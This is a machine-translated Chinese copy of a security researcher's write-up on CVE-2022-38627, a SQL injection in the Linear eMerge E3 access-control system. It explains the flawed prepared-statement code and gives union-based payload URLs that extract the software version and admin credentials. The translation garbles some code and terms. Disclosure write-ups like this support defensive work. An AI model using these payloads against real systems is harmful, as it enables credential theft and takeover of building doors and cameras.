<html>
<head>
<title>CVE-2022-38627: A journey through SQLite Injection to compromise the whole enterprise building</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CVE-2022-38627:通过SQLite注入来折衷整个企业构建的旅程</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cve-2022-38627-a-journey-through-sqlite-injection-to-compromise-the-whole-enterprise-building-15cebd072ed6?source=collection_archive---------0-----------------------#2022-12-30">https://infosecwriteups.com/cve-2022-38627-a-journey-through-sqlite-injection-to-compromise-the-whole-enterprise-building-15cebd072ed6?source=collection_archive---------0-----------------------#2022-12-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="9528" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">简介:</h2></div><p id="05aa" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这项研究中，我将向您展示我是如何设法找到这一关键的0天，使我能够控制整个企业大楼(门、摄像头、电梯等)。除此之外，我还可以收集员工数据，并添加有权进入企业大楼的新员工，所有这些都不包括严重的SQL注入漏洞的自然影响</p><p id="fcca" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">实际上，在这项研究中，你将看到黑客攻击电影场景的实现，而不是现实生活中的场景</p><h2 id="0fde" class="lb lc iq bd ld le lf dn lg lh li dp lj ko lk ll lm ks ln lo lp kw lq lr ls lt bi translated">线性浮现E3系列产品概述:</h2><p id="db91" class="pw-post-body-paragraph kf kg iq kh b ki lu jr kk kl lv ju kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">线性浮现E3系列是建筑管理系统中的行业领先产品之一，因为它是控制行业中使用最广泛的产品之一</p><ul class=""><li id="b045" class="lz ma iq kh b ki kj kl km ko mb ks mc kw md la me mf mg mh bi translated">学区和校园(K12和高等教育)</li><li id="25bb" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">企业园区</li><li id="c299" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">州/地方政府建筑(市政中心、市政厅、警察局、监狱等。)</li><li id="261f" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">公用事业</li><li id="f41f" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">交通(机场、地铁、公共汽车站)</li><li id="7817" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">礼拜场所(教堂、大型教堂校园)</li><li id="b00d" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">医疗设施(医院、制药公司、生物实验室等。)</li><li id="eb98" class="lz ma iq kh b ki mi kl mj ko mk ks ml kw mm la me mf mg mh bi translated">更多</li></ul><h2 id="1e48" class="lb lc iq bd ld le lf dn lg lh li dp lj ko lk ll lm ks ln lo lp kw lq lr ls lt bi translated">让我们开始静态分析:</h2><p id="42ab" class="pw-post-body-paragraph kf kg iq kh b ki lu jr kk kl lv ju kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">我遇到了这个endpoint/badging/badge _ template _ print . PHP，所以让我们来看看代码</p><p id="ce00" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">正如您所看到的，开发人员通过“idt”参数获取用户输入，然后使用prepare语句将其传递给查询，这应该可以防止SQL注入</p><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi mn"><img src="../Images/35ec351b9720b444bed703d6e86237ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3X8kkrpbadD5_x7k7YLQfQ.png"/></div></div></figure><p id="45bc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是等一下，这里有一个错误的prepare语句实现，要知道哪里出错了，我们需要先了解什么是(prepare语句工作流)</p><h1 id="4135" class="mz lc iq bd ld na nb nc lg nd ne nf lj jw ng jx lm jz nh ka lp kc ni kd ls nj bi translated">准备好的语句如何工作:</h1><p id="f5fb" class="pw-post-body-paragraph kf kg iq kh b ki lu jr kk kl lv ju kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">预处理语句处理工作流经过7个阶段</p><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nk"><img src="../Images/cd70331a5fbbd02502c7f2427631a698.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lKuFL9k7UywfNc8r.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated"><strong class="bd ld">准备SQL查询处理的语句阶段<em class="np"/></strong></figcaption></figure><p id="f025" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">它简单地将查询传递给数据库，就像这样</p><blockquote class="nq nr ns"><p id="5e9f" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">$ sth = $ db--&gt; prepare(" SELECT * FROM " . dbtable . " where No =？");</p></blockquote><p id="30d0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因为问号被称为参数占位符</p><p id="9087" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，在准备好的语句下，查询将经过7个阶段:</p><p id="9e6f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 1-解析阶段:</strong>解析语法错误和拼写错误，以确保SQL查询的有效性</p><p id="5525" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 2-语义检查阶段:</strong>数据库管理系统(DBMS)确定查询的有效性。指定的列和表是否存在？用户是否有执行此查询的权限？</p><p id="175c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 3-绑定阶段:</strong>数据库引擎检测占位符，使用占位符编译查询。用户提供的数据将在稍后添加(类似占位符替换阶段)。</p><blockquote class="nq nr ns"><p id="9866" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">$sth-&gt;bindValue(1，$id，PDO::PARAM _ INT)；</p></blockquote><p id="e26c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 4-查询优化</strong> <strong class="kh ir">阶段:</strong>DBMS选择执行查询的最佳算法。</p><p id="cd94" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 5-缓存</strong> <strong class="kh ir">阶段:</strong>最佳算法保存在缓存中，因此下次执行相同的查询时，它将跳过前四个阶段，直接跳到占位符替换阶段</p><p id="e731" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 6-占位符替换</strong> <strong class="kh ir">阶段:</strong>在此阶段，占位符被替换为用户的数据。但是，查询已经被预先编译好了(<strong class="kh ir">绑定</strong>)，所以最终的查询不会再经过编译阶段。因此，用户提供的数据将始终被解释为简单的字符串，不能修改原始查询的逻辑。这使得查询不会受到该数据的SQL注入漏洞的影响。</p><p id="8a18" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 7-执行阶段:</strong></p><blockquote class="nq nr ns"><p id="e8d7" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">$ sth-&gt; execute()；</p></blockquote><p id="ba4d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，查询成功执行</p><p id="3d54" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这些是准备好的语句为防止SQL注入而要经过的阶段</p><p id="b907" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以让我们再来看看这里发生了什么</p><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi mn"><img src="../Images/b0ad9235e0ba07c8627f715b84d59487.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IR15S8ZKs9fBnppo_p_SrA.png"/></div></div></figure><p id="883e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">开发人员将来自用户的$id参数放入准备好的语句中，而不是像我上面描述的那样绑定值，所以如果用户输入参数是这样的</p><blockquote class="nq nr ns"><p id="048d" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">？id=1 UNION SELECT * FROM User</p></blockquote><p id="cb04" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">那么$sth变量值将是这样的</p><blockquote class="nq nr ns"><p id="f2cc" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">$ db--&gt; prepare(" SELECT * FROM User，其中No=1 UNION SELECT * FROM User ")</p></blockquote><p id="1b26" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，准备好的语句将把我们的输入作为查询的一部分(不认为它是绑定值),并且用户输入将通过从第一阶段开始的所有阶段，这意味着用户输入将被认为是查询的一部分，因为SQL编译器将把它编译为查询的一部分，并且不会被认为是绑定值，因为它是从第一阶段而不是在第六阶段(占位符替换)在查询中传递的，这将导致成功的SQLI</p><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nx"><img src="../Images/72326f4faa9665064739ebe38d50e1bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qPmcPQ5kclzbCDcqGmbndQ.png"/></div></div></figure><p id="666a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">$xml变量是通过使用参数“tpl”加载xml文件</p><p id="1a28" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">首先“if语句”迫使我们加载一个包含<picture>标签的XML文件，因为开发人员为此创建了这个XML文件“aa.xml ”,所以我们需要做的只是将文件名放入“tpl”参数中？tpl=aa.xml</picture></p><p id="9683" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们需要将第二个“if语句”设置为false来执行，否则将打印页面中的“ImageFile”列来提取数据库内容</p><p id="26ea" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，在我们的开发中，我们需要连接ImageFile列上的输出，因为这是提取数据库的可能方式</p><h2 id="c55c" class="lb lc iq bd ld le lf dn lg lh li dp lj ko lk ll lm ks ln lo lp kw lq lr ls lt bi translated">剥削:</h2><p id="93ed" class="pw-post-body-paragraph kf kg iq kh b ki lu jr kk kl lv ju kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">因为我已经访问了源代码和数据库，所以我知道ImageFile列是“User”表的39列中的第12列，所以我们不需要像利用黑盒SQL注入那样利用它</p><p id="f20e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，我们将使用基于联合的有效负载来利用它，因此我们需要连接第12列的输出，并用空值定义其他38列</p><blockquote class="nq nr ns"><p id="624a" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">/badging/badge _ template _ print . PHP？tpl=aa.xml&amp;idt=1337 UNION SELECT空，空，空，空，空，空，空，空，空，空，' SWVersion:'||SWVersion，空，空，空，空，空，空，空，空，空，空，空，空，空，空</p></blockquote><p id="93f2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">输出将是版本表中的软件版本，因此我在第12列连接了输出，这将使输出看起来像这样</p><p id="385e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">软件版本:<software version="" will="" be="" printed="" here=""/></p><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ny"><img src="../Images/48ea615e5da9605cb9e01faf0b010ad9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5xr-t5VYkNHih--qGyOMOA.png"/></div></div></figure><p id="b39e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">提取管理员凭证怎么样</p><blockquote class="nq nr ns"><p id="2106" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">/badging/badge _ template _ print . PHP？TPL = aa . XML &amp; IDT = 1337 union select NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，' Admin-ID-is:' | | ID | | ' % 20 Admin-Password-is:' | | Password，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL，NULL</p></blockquote><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nz"><img src="../Images/82201a4c5a4a591f03c12e7527fdecaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jwRURWoxihsqsvxxWB7wBw.png"/></div></div></figure><p id="1956" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">获得管理员凭据后，我可以使用它们登录，从web仪表板控制整个企业建筑</p><h2 id="58c9" class="lb lc iq bd ld le lf dn lg lh li dp lj ko lk ll lm ks ln lo lp kw lq lr ls lt bi translated">自动化:</h2><p id="a126" class="pw-post-body-paragraph kf kg iq kh b ki lu jr kk kl lv ju kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">为了检测漏洞，我制作了这个nuclei模板来扫描您的bug bounty程序或您的企业资产</p><p id="4b53" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您可以在我的安全研究资料库中找到它:</p><p id="39ad" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">https://github . com/omarhashem 123/Security-Research/tree/main/CVE-2022-38627</p><blockquote class="nq nr ns"><p id="5f60" class="kf kg nt kh b ki kj jr kk kl km ju kn nu kp kq kr nv kt ku kv nw kx ky kz la ij bi translated">┌──(omar㉿kali)-[~] <br/> └─$原子核-t CVE-2022–38627 . YAML-l子域名. txt</p></blockquote><figure class="mo mp mq mr gt ms gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi oa"><img src="../Images/faf841918c8094f06bf835f9d82adb65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hIwKeG7VqAyucTTrEibP5Q.png"/></div></div></figure><p id="cdc8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这一点上，我们刚刚到达结束，所以我希望你们喜欢</p><h1 id="168e" class="mz lc iq bd ld na nb nc lg nd ne nf lj jw ng jx lm jz nh ka lp kc ni kd ls nj bi translated">保持联络</h1><p id="d2df" class="pw-post-body-paragraph kf kg iq kh b ki lu jr kk kl lv ju kn ko lw kq kr ks lx ku kv kw ly ky kz la ij bi translated">推特:<a class="ae ob" href="https://twitter.com/OmarHashem666" rel="noopener ugc nofollow" target="_blank"> @OmarHashem666 </a></p><p id="f100" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">领英:【https://www.linkedin.com/in/omar-1-hashem T4】</p><p id="39a1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">YouTube:<a class="ae ob" href="https://www.youtube.com/@omarhashem7351" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/@omarhashem7351</a></p><figure class="mo mp mq mr gt ms"><div class="bz fp l di"><div class="oc od l"/></div></figure></div></div>    
</body>
</html>